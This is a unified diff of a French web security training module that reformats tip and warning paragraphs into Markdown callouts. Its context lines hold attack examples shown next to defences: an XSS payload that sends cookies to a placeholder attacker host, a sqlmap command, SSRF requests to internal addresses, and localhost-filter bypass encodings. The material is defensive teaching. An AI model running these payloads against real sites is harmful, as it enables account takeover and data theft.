@@ -76,10 +76,11 @@ flowchart LR
 | Secrets (clés d'API, mots de passe de base) | Dépôt Git, images Docker, variables d'environnement, logs CI | Accès direct aux données, sans passer par l'application |
 | Port de la base de données | 5432, 3306, 6379, 27017, 9200 mal filtrés | Lecture ou chiffrement de toutes les données |
 
-🧠 **Concept clé : la session.** HTTP est sans état, et l'application doit donc rattacher chaque requête à un utilisateur. Deux modèles dominent :
-
-- **Session côté serveur** : un identifiant opaque dans un cookie, l'état étant stocké côté serveur.
-- **Jeton signé** comme un JWT (JSON Web Token), où l'état voyage dans le jeton et le serveur ne vérifie que la signature.
+> 🧠 **Concept clé : la session.** HTTP est sans état, et l'application doit donc rattacher chaque requête à un utilisateur. Deux modèles dominent :
+>
+> - **Session côté serveur** : un identifiant opaque dans un cookie, l'état étant stocké côté serveur.
+> - **Jeton signé** comme un JWT (JSON Web Token), où l'état voyage dans le jeton et le serveur ne vérifie que la signature.
+{: .callout .callout-important}
 
 Le vol du cookie ou du jeton équivaut au vol du compte. Les attributs du cookie sont donc la première ligne de défense :
 
@@ -91,7 +92,8 @@ Set-Cookie: sid=<RANDOM_128_BITS>; Path=/; Secure; HttpOnly; SameSite=Lax
 - `HttpOnly` : un script injecté ne peut pas lire le cookie.
 - `SameSite` : le navigateur n'envoie pas le cookie sur la plupart des requêtes déclenchées depuis un autre site.
 
-🔒 Côté API, le modèle `Authorization: Bearer <TOKEN>` n'est pas envoyé automatiquement par le navigateur, ce qui change l'analyse CSRF (voir plus bas). En contrepartie, le jeton stocké en `localStorage` est lisible par n'importe quel XSS.
+> 🔒 Côté API, le modèle `Authorization: Bearer <TOKEN>` n'est pas envoyé automatiquement par le navigateur, ce qui change l'analyse CSRF (voir plus bas). En contrepartie, le jeton stocké en `localStorage` est lisible par n'importe quel XSS.
+{: .callout .callout-securite}
 
 ### Qui attaque, et quoi
 
@@ -123,13 +125,15 @@ L'OWASP (Open Worldwide Application Security Project) publie un classement des r
 
 La famille A01 (contrôle d'accès) est en tête depuis l'édition 2021 : l'erreur la plus répandue n'est pas une subtilité de cryptographie, mais l'absence d'un `if` côté serveur.
 
-💡 Pour un audit, transformez cette table en questions : « Quelles données un utilisateur A peut-il atteindre qui appartiennent à B ? » « Quelle entrée utilisateur arrive dans une requête, un shell, un gabarit, une URL ? » C'est plus actionnable que « vérifier l'OWASP ».
+> 💡 Pour un audit, transformez cette table en questions : « Quelles données un utilisateur A peut-il atteindre qui appartiennent à B ? » « Quelle entrée utilisateur arrive dans une requête, un shell, un gabarit, une URL ? » C'est plus actionnable que « vérifier l'OWASP ».
+{: .callout .callout-important}
 
 ## Mécanismes d'attaque
 
 ### Injection SQL
 
-🔴 **Vecteur d'attaque.** Une requête construite par concaténation mélange code et données :
+> 🔴 **Vecteur d'attaque.** Une requête construite par concaténation mélange code et données :
+{: .callout .callout-danger}
 
 ```python
 # Vulnérable
@@ -157,7 +161,8 @@ Le `--` commente la vérification du mot de passe. Quelques payloads classiques 
 sqlmap -u "https://<HOST>/items?id=1" --cookie="sid=<SESSION>" --batch --level=2
 ```
 
-🔒 **Contrôle.** Les requêtes paramétrées séparent le texte de la requête de ses valeurs, et le moteur ne ré-interprète jamais les valeurs comme du SQL :
+> 🔒 **Contrôle.** Les requêtes paramétrées séparent le texte de la requête de ses valeurs, et le moteur ne ré-interprète jamais les valeurs comme du SQL :
+{: .callout .callout-securite}
 
 ```python
 cursor.execute(
@@ -175,7 +180,8 @@ Le compte applicatif à privilèges minimaux (voir section base de données) lim
 
 ### XSS (Cross-Site Scripting)
 
-🔴 **Vecteur d'attaque.** L'application affiche dans une page une donnée contrôlée par l'attaquant sans l'encoder pour son contexte. Dans un champ de commentaire :
+> 🔴 **Vecteur d'attaque.** L'application affiche dans une page une donnée contrôlée par l'attaquant sans l'encoder pour son contexte. Dans un champ de commentaire :
+{: .callout .callout-danger}
 
 ```html
 <img src=x onerror="fetch('https://<ATTACKER>/c?d='+document.cookie)">
@@ -183,12 +189,14 @@ Le compte applicatif à privilèges minimaux (voir section base de données) lim
 
 Si ce commentaire est stocké (XSS stocké), il s'exécute dans le navigateur de chaque visiteur, y compris celui d'un administrateur. Ce script agit avec les droits de la victime : il lit la page, soumet des formulaires, appelle l'API.
 
-⚠️ `HttpOnly` empêche de lire le cookie, mais n'empêche pas le script d'agir *depuis* la session. Un XSS reste une prise de contrôle du compte, sans voler le cookie.
+> ⚠️ `HttpOnly` empêche de lire le cookie, mais n'empêche pas le script d'agir *depuis* la session. Un XSS reste une prise de contrôle du compte, sans voler le cookie.
+{: .callout .callout-attention}
 
-🔒 **Contrôles.**
-
-- Encodage contextuel en sortie : HTML, attribut, JavaScript et URL n'exigent pas le même échappement. Les frameworks modernes (React, Vue, Jinja2 en autoescape) le font par défaut. Les risques reviennent avec `dangerouslySetInnerHTML`, `v-html`, `|safe` ou `innerHTML`.
-- Une CSP (Content Security Policy) en défense en profondeur :
+> 🔒 **Contrôles.**
+>
+> - Encodage contextuel en sortie : HTML, attribut, JavaScript et URL n'exigent pas le même échappement. Les frameworks modernes (React, Vue, Jinja2 en autoescape) le font par défaut. Les risques reviennent avec `dangerouslySetInnerHTML`, `v-html`, `|safe` ou `innerHTML`.
+> - Une CSP (Content Security Policy) en défense en profondeur :
+{: .callout .callout-securite}
 
 ```http
 Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<RANDOM>'; object-src 'none'; base-uri 'self'
@@ -200,11 +208,12 @@ Le coût est réel : les scripts inline existants cassent, il faut les externali
 
 C'est la famille qu'aucun outil automatique ne détecte bien, car le scanner ne sait pas ce que « autorisé » veut dire pour votre métier.
 
-🔴 **Trois variantes à tester à la main** :
-
-- **IDOR (accès à un objet d'un autre utilisateur)** : changer `8812` en `8813`. Remplacer l'identifiant numérique par un UUID ne règle rien si l'autorisation n'est pas vérifiée : c'est seulement plus dur à deviner.
-- **Contrôle au niveau de la fonction** : un utilisateur standard appelle `POST /api/admin/users` et obtient un 200 parce que seul le menu était masqué dans l'interface.
-- **Mass assignment** : le client ajoute des champs que le formulaire ne propose pas, par exemple `PATCH /api/me` avec `{"name":"Bob","role":"admin"}`, et le framework copie tous les champs vers le modèle.
+> 🔴 **Trois variantes à tester à la main** :
+>
+> - **IDOR (accès à un objet d'un autre utilisateur)** : changer `8812` en `8813`. Remplacer l'identifiant numérique par un UUID ne règle rien si l'autorisation n'est pas vérifiée : c'est seulement plus dur à deviner.
+> - **Contrôle au niveau de la fonction** : un utilisateur standard appelle `POST /api/admin/users` et obtient un 200 parce que seul le menu était masqué dans l'interface.
+> - **Mass assignment** : le client ajoute des champs que le formulaire ne propose pas, par exemple `PATCH /api/me` avec `{"name":"Bob","role":"admin"}`, et le framework copie tous les champs vers le modèle.
+{: .callout .callout-danger}
 
 Le test minimal avec deux comptes :
 
@@ -216,11 +225,12 @@ curl -s -o /dev/null -w "%{http_code}\n" \
 
 Le résultat attendu est 403 ou 404. Un 200 est un constat critique. L'extension Burp **Autorize** automatise ce rejeu avec le jeton d'un autre rôle sur chaque requête enregistrée.
 
-🔒 **Contrôles.**
-
-- Refus par défaut : un endpoint sans règle explicite est fermé.
-- Vérification d'appartenance côté serveur à chaque requête, centralisée dans une politique ou un middleware plutôt que recopiée dans chaque contrôleur, sinon un seul oubli suffit.
-- Liste blanche des champs modifiables (DTO, schéma), jamais une copie aveugle du corps JSON vers le modèle.
+> 🔒 **Contrôles.**
+>
+> - Refus par défaut : un endpoint sans règle explicite est fermé.
+> - Vérification d'appartenance côté serveur à chaque requête, centralisée dans une politique ou un middleware plutôt que recopiée dans chaque contrôleur, sinon un seul oubli suffit.
+> - Liste blanche des champs modifiables (DTO, schéma), jamais une copie aveugle du corps JSON vers le modèle.
+{: .callout .callout-securite}
 
 ### CSRF et SSRF
 
@@ -251,12 +261,13 @@ http://10.0.0.5:9200/_cat/indices
 
 Sur un hôte cloud, la première cible est le service de métadonnées, qui peut livrer des identifiants temporaires. Ce mécanisme a été au cœur de l'intrusion Capital One en 2019, où une requête SSRF via un pare-feu applicatif mal configuré avait permis de récupérer des identifiants cloud. Les détails de durcissement cloud relèvent du module suivant.
 
-🔒 **Contrôles réalistes.**
-
-- Liste blanche de domaines de destination quand le besoin le permet.
-- Sinon, résoudre le nom, vérifier que l'IP n'est ni privée, ni loopback, ni link-local, puis se connecter à *cette* IP (sans re-résoudre, pour éviter le DNS rebinding).
-- Désactiver le suivi des redirections ou les revalider.
-- Filtrage des flux sortants au niveau réseau : le serveur applicatif n'a pas à joindre le réseau interne.
+> 🔒 **Contrôles réalistes.**
+>
+> - Liste blanche de domaines de destination quand le besoin le permet.
+> - Sinon, résoudre le nom, vérifier que l'IP n'est ni privée, ni loopback, ni link-local, puis se connecter à *cette* IP (sans re-résoudre, pour éviter le DNS rebinding).
+> - Désactiver le suivi des redirections ou les revalider.
+> - Filtrage des flux sortants au niveau réseau : le serveur applicatif n'a pas à joindre le réseau interne.
+{: .callout .callout-securite}
 
 Une liste noire de `127.0.0.1` et `localhost` est contournée par `0x7f000001`, `127.1`, `[::1]` ou un domaine pointant vers 127.0.0.1.
 
@@ -288,32 +299,35 @@ Exemples de failles totalement invisibles pour HTTPS, le WAF ou le scanner :
 | Rejeu de bon de réduction | Même code envoyé 50 fois | Aucun compteur d'utilisation |
 | Course critique (race condition) | 20 retraits simultanés avec 100 € de solde | La vérification du solde et le débit ne sont pas atomiques |
 
-🔒 **Contrôles.**
-
-- Le serveur recalcule tout ce qui compte (prix, remise, droits) à partir de ses propres données.
-- Une machine à états explicite impose l'ordre du workflow.
-- Une clé d'idempotence sur les opérations sensibles.
-- Une transaction avec verrou (`SELECT ... FOR UPDATE`) ou une contrainte en base (`CHECK (balance >= 0)`) pour les accès concurrents.
+> 🔒 **Contrôles.**
+>
+> - Le serveur recalcule tout ce qui compte (prix, remise, droits) à partir de ses propres données.
+> - Une machine à états explicite impose l'ordre du workflow.
+> - Une clé d'idempotence sur les opérations sensibles.
+> - Une transaction avec verrou (`SELECT ... FOR UPDATE`) ou une contrainte en base (`CHECK (balance >= 0)`) pour les accès concurrents.
+{: .callout .callout-securite}
 
 Le coût : ces règles ne sont jamais fournies par un framework, il faut les concevoir. La méthode qui fonctionne est de lister des « cas d'abus » pendant la conception : pour chaque fonctionnalité, demander ce qu'un client malveillant tenterait d'en faire.
 
 ## Gestion des secrets
 
-🔴 **Vecteur d'attaque.** Les secrets fuient par des chemins banals :
-
-- Un `.env` ou un `config.py` commité « une seule fois ». Le secret reste dans l'historique Git même après suppression.
-- Une couche d'image Docker construite avec `COPY .env`, récupérable par quiconque tire l'image.
-- Des logs CI qui impriment les variables.
-- Un bundle JavaScript front qui embarque une clé d'API privée.
+> 🔴 **Vecteur d'attaque.** Les secrets fuient par des chemins banals :
+>
+> - Un `.env` ou un `config.py` commité « une seule fois ». Le secret reste dans l'historique Git même après suppression.
+> - Une couche d'image Docker construite avec `COPY .env`, récupérable par quiconque tire l'image.
+> - Des logs CI qui impriment les variables.
+> - Un bundle JavaScript front qui embarque une clé d'API privée.
+{: .callout .callout-danger}
 
 Les robots scannent les dépôts publics en continu. Un secret exposé peut être exploité en quelques minutes, bien avant la découverte par l'équipe.
 
-🔒 **Contrôles.**
-
-- **Stockage** : un gestionnaire de secrets (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, Kubernetes Secrets avec chiffrement) plutôt que des fichiers. Les variables d'environnement sont acceptables comme transport vers le processus, mais elles apparaissent dans `docker inspect`, `/proc/<PID>/environ` et les dumps d'erreur.
-- **Détection** : `gitleaks` en pre-commit et en CI.
-- **Rotation** : ordre strict en cas de fuite : révoquer et régénérer d'abord, nettoyer l'historique ensuite. Réécrire l'historique avec `git filter-repo` n'annule pas la compromission, car le secret a pu être copié.
-- **Durée de vie courte** : des identifiants temporaires (tokens de quelques heures, identifiants de base dynamiques Vault) réduisent la fenêtre d'exploitation.
+> 🔒 **Contrôles.**
+>
+> - **Stockage** : un gestionnaire de secrets (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, Kubernetes Secrets avec chiffrement) plutôt que des fichiers. Les variables d'environnement sont acceptables comme transport vers le processus, mais elles apparaissent dans `docker inspect`, `/proc/<PID>/environ` et les dumps d'erreur.
+> - **Détection** : `gitleaks` en pre-commit et en CI.
+> - **Rotation** : ordre strict en cas de fuite : révoquer et régénérer d'abord, nettoyer l'historique ensuite. Réécrire l'historique avec `git filter-repo` n'annule pas la compromission, car le secret a pu être copié.
+> - **Durée de vie courte** : des identifiants temporaires (tokens de quelques heures, identifiants de base dynamiques Vault) réduisent la fenêtre d'exploitation.
+{: .callout .callout-securite}
 
 Le prix à payer est une dépendance de plus : si le gestionnaire de secrets est indisponible au démarrage, l'application ne démarre pas. Prévoir un cache local et un test de panne.
 
@@ -404,7 +418,8 @@ docker run --rm -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://<ST
 
 Les options et les images évoluent entre versions : consultez l'aide de l'outil installé.
 
-💡 Écrivez aussi des **tests unitaires d'autorisation** : « l'utilisateur A reçoit 403 sur la facture de B ». C'est le seul test automatisé qui couvre réellement le contrôle d'accès, et il protège contre les régressions à chaque modification de code.
+> 💡 Écrivez aussi des **tests unitaires d'autorisation** : « l'utilisateur A reçoit 403 sur la facture de B ». C'est le seul test automatisé qui couvre réellement le contrôle d'accès, et il protège contre les régressions à chaque modification de code.
+{: .callout .callout-important}
 
 Après ce module, vous devez savoir tester au minimum : un IDOR avec deux comptes, les attributs d'un cookie de session, un champ de saisie avec un caractère `'`, la présence de secrets dans un dépôt, et l'exposition réseau des ports de base de données.
 
